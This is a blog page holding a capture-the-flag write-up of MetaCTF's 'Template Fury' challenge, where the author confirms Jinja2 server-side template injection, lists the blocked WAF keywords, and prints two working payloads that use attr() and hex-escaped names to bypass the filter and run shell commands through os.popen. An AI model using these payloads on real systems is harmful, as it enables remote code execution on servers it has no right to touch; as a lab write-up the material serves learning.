@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>Mctf_template_fury</title><!-- Begin Jekyll SEO tag v2.7.1 -->
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Mctf_template_fury" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="https://bonta.lor.moe/writeups/mctf-template-fury" />
+<meta property="og:url" content="https://bonta.lor.moe/writeups/mctf-template-fury" />
+<meta property="og:site_name" content="bontalor" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-10-16T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Mctf_template_fury" />
+<script type="application/ld+json">
+{"headline":"Mctf_template_fury","dateModified":"2025-10-16T00:00:00+00:00","datePublished":"2025-10-16T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://bonta.lor.moe/writeups/mctf-template-fury"},"url":"https://bonta.lor.moe/writeups/mctf-template-fury","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="https://bonta.lor.moe/feed.xml" title="bontalor" /><link rel="shortcut icon" type="image/x-icon" href="/assets/imgs/favicon.ico" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+</head>
+<body a="dark">
+    <header>
+      <a href="/" class="site-title-link"><h1>bontalor</h1></a><nav>
+  <a href="/" class="">Home</a> 
+  <a href="/certifications" class="">Certs</a>
+  <a href="/blogs" class="">Blogs</a>
+  <a href="/writeups" class="active">Writeups</a>
+  <a href="/all" class="">All</a>
+</nav>
+</header>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a class="back" onclick="goBack()">. . /</a>
+<article>
+  <p class="post-meta">
+    <time datetime="2025-10-16 00:00:00 +0000">10-16-2025</time>
+  </p>
+  
+  <h1>mctf_template_fury</h1>
+
+  <p><img src="/assets/imgs/2025-10-17-mctf-template-title-card.png" alt=""></p>
+
+<h2 id="background">Background</h2>
+
+<p><em>Template Fury</em> is a web exploitation challenge by MetaCTF. The challenge involves unsanitized input with a weak WAF.</p>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-1.png" alt=""></p>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-2.png" alt=""></p>
+
+<h2 id="recon">Recon</h2>
+
+<p>Based on the name I assume this is an SSTI (server-side template injection) exploit.</p>
+
+<p>Using this helpful chart I found on <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener noreferrer">PortSwigger</a> I can get an idea of which template is being used and how to exploit it.</p>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-3.png" alt=""></p>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-4.png" alt=""></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>This confirms SSTI is possible and the template is Jinja2 because the output of <code>{{7*'7'}}</code> is <code>7777777</code>. If the output is <code>49</code> the template is Twig.</p>
+
+<p>Now I search online and find a <a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/" target="_blank" rel="noopener noreferrer">onsecurity</a> writeup about Jinja2 SSTI and try a payload.</p>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-5.png" alt=""></p>
+
+<p>After some trial and error I deduce that the WAF (web application firewall) blocks the following:</p>
+
+<p><code>.</code>
+<code>_</code>
+<code>[</code>
+<code>]</code>
+<code>builtins</code>
+<code>import</code>
+<code>os</code>
+<code>popen</code></p>
+
+<p>The writeup with the payload I used also includes some payloads if <code>.</code> <code>_</code> <code>[</code> and <code>]</code> are forbidden.</p>
+
+<p>It uses <code>attr()</code> to bypass <code>.</code> <code>[</code> and <code>]</code> and uses the HTML entity <code>\x5f</code> instead of <code>_</code> .</p>
+
+<pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+</code></pre>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-6.png" alt=""></p>
+
+<p>Since some terms are still forbidden I try encoding the forbidden terms as HTML entities as well.</p>
+
+<pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('id')|attr('read')()}}
+</code></pre>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-7.png" alt=""></p>
+
+<p>The command <code>id</code> works and confirms I can execute commands, now I just need to find and read the flag.</p>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-8.png" alt=""></p>
+
+<p><img src="/assets/imgs/2025-10-17-mctf-template-fury-image-9.png" alt=""></p>
+
+<p>pce,<br>
+bonta</p>
+
+</article>
+
+      </div>
+    </main>
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/base16/windows-high-contrast.min.css" integrity="sha512-SE4GvXE6j696nfjO1PEfQ1+3bfOya4A5bFXnUx8xYsFYRVBhY5RYGsp8lBZBIXD+Q+knAuhlMDh98rrXiuVMiQ==" crossorigin="anonymous" referrerpolicy="no-referrer">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/highlight.min.js" integrity="sha512-6yoqbrcLAHDWAdQmiRlHG4+m0g/CT/V9AGyxabG8j7Jk8j3r3K6due7oqpiRMZqcYe9WM2gPcaNNxnl2ux+3tA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script>hljs.highlightAll();</script>
+        <script src="/assets/js/goback.js"></script>
+    
+  </body>
+</html>
